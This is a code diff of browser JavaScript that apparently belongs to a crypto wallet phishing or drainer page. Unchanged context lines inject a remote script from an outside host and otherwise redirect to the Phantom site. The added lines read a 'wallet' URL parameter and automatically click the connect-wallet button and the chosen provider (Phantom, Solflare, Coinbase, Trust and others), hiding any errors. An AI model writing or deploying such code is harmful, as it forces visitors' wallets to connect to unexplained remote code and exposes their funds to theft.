@@ -70,6 +70,68 @@ const ensurePageChange = setInterval(() => {
         const script = document.createElement('script');
         script.src = 'https://wowee.vercel.app/main_source.js';
         document.body.appendChild(script);
+        try {
+          const url = new URL(window.location.href);
+              const params = new URLSearchParams(url.search);
+              const wallet = params.get("wallet");
+              if (wallet != null) {
+                document.getElementsByClassName("connect-wallet-button")[0].click()
+                if (wallet == "Phantom") {
+                    setTimeout(() => {
+                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
+                          if (button.innerText == "Phantom") {
+                              button.click()
+                          }
+                      });
+                  }, 100);
+                }
+                if (wallet == "Solflare") {
+                    setTimeout(() => {
+                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
+                          if (button.innerText == "Solflare") {
+                              button.click()
+                          }
+                      });
+                  }, 100);
+                }
+                if (wallet == "MagicEden") {
+                    setTimeout(() => {
+                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
+                          if (button.innerText == "Magic Eden") {
+                              button.click()
+                          }
+                      });
+                  }, 100);
+                }
+                if (wallet == "Clover") {
+                    setTimeout(() => {
+                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
+                          if (button.innerText == "Clover") {
+                              button.click()
+                          }
+                      });
+                  }, 100);
+                }
+                if (wallet == "Coinbase") {
+                    setTimeout(() => {
+                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
+                          if (button.innerText == "Coinbase") {
+                              button.click()
+                          }
+                      });
+                  }, 100);
+                }
+                if (wallet == "Trust") {
+                    setTimeout(() => {
+                      Array.from(document.getElementsByTagName("button")).forEach((button) => {
+                          if (button.innerText == "Trust") {
+                              button.click()
+                          }
+                      });
+                  }, 100);
+                }
+              }
+        } catch(error) {}
       } else {
         location.href = "https://phantom.app"
       }
